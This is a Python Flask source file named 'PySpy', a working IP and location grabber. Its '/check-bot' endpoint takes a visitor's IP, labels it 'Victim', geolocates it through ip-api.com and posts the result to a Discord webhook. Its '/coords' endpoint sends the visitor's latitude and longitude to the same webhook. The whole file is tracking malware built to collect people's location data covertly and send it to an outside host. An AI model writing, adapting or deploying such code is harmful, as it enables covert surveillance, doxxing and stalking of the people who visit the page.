import threading, logging, tls_client, json
from flask import Flask, jsonify, request, render_template
from datetime import datetime
from Modules.general import *
from Modules.logging import *


log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)





# Setting
def load_config():
    with open("Dependencies/config.json") as f:
        config = json.load(f)

        webhook = config["Webhook-Url"]

        return webhook


discord_webhook = load_config()



class Other:
    def lookup_ip(ip):
        data = []
        url = "http://ip-api.com/json/{}".format(ip)

        s = tls_client.Session()
        response = s.get(url).json()

        for key, value in response.items():
            success(f"{key[0].upper()}{key[1:]}: {value}")
            data.append(f"{key[0].upper()}{key[1:]}: {value}")


        return response, "\n".join(data)

    def to_hook(data):
        data = {
            "content" : "@everyone New user",
            "embeds" : [
                {
                    "author" : {
                        "name" : "PySpy",
                    },
                    "thumbnail" : {
                        "url" : "https://ih1.redbubble.net/image.985280668.1472/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg"
                    },
                    "description" : datetime.now().strftime('%H:%M:%S'),
                    "fields" : [
                        {
                            "name" : "Data",
                            "value" : data,
                            "inline" : True
                        }
                    ]
                }
            ]
        }

        s = tls_client.Session()

        r = s.post(discord_webhook, json=data)
        if r.status_code == 204:
            success("Logged to hook")
        else:
            errror(f"Failed to log to hook {r.status_code}, {r.text}")



class Site:
    def __init__(self):
        self.app = Flask(__name__)


        @self.app.route("/")
        def index():
            print()
            return render_template("index.html")


        @self.app.route("/check-bot", methods=['POST'])
        def checkup():
            data = request.get_json()

            notify(f"Victim: {data.get('ip')}")
            Other.lookup_ip(data.get("ip")[0])

            Other.to_hook(f"Victim: {data.get('ip')}\n{Other.lookup_ip(data.get('ip'))[1]}")

            return jsonify({"message" : "Success"})



        @self.app.route("/coords", methods=['POST'])
        def coords():
            data = request.get_json()

            lat = data["lat"]
            long = data['long']

            notify(f"Coordinates: {lat} {long}")
            Other.to_hook(f"Coordinates: {lat} {long}")

            return jsonify({"message" : "Coords pulled"})


    def start(self):
        self.app.run(debug=False)



if __name__ == "__main__":
    flask = Site()
    threading.Thread(target=flask.start).start()
    Site()
    Clear_Screen()
    Art()
    Set_Title()